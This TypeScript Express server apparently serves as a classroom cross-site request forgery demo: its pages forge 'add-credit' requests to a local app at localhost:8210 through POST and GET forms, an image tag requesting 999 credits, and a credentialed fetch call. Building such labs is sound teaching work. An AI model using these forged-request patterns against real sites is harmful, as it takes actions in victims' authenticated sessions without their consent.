import express, { Request, Response } from 'express'
import bodyParser from 'body-parser'
import pino from 'pino'
import expressPinoLogger from 'express-pino-logger'

// set up Express
const app = express()
const port = parseInt(process.env.PORT) || 8219
app.use(bodyParser.urlencoded({ extended: true }))

// set up Pino logging
const logger = pino({ transport: { target: 'pino-pretty' }})
app.use(expressPinoLogger({ logger }))

app.get(
  "/malicious-image",
  (req, res) => {
    res.status(200).send(`
Added 999!
<img src="http://localhost:8210/add-credit?amount=999">
    `)
  }
)

app.get(
  "/",
  (req, res) => {
    res.status(200).send(`
<h1>buwahahaha</h1>
<form method="POST" action="http://localhost:8210/add-credit">
<input name="amount" value="1">
<input type="submit" value="Add Credit via POST">
</form>
<form method="GET" action="http://localhost:8210/add-credit">
<input name="amount" value="1">
<input type="submit" value="Add Credit via GET">
</form>
<a href="/malicious-image">Add Credit via malicious img tag</a> 
<button onclick="addCreditViaFetch()">Add 100 credits via fetch POST</button>
<script>
function addCreditViaFetch() {
  fetch(
    "http://localhost:8210/add-credit", 
    { 
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include",
      body: JSON.stringify({ amount: 100 }),
    }
  ).then(() => alert('done'))
}
</script>
    `)
  }
)

// start server
app.listen(port, () => {
  console.log(`Server listening on port ${port}`)
})
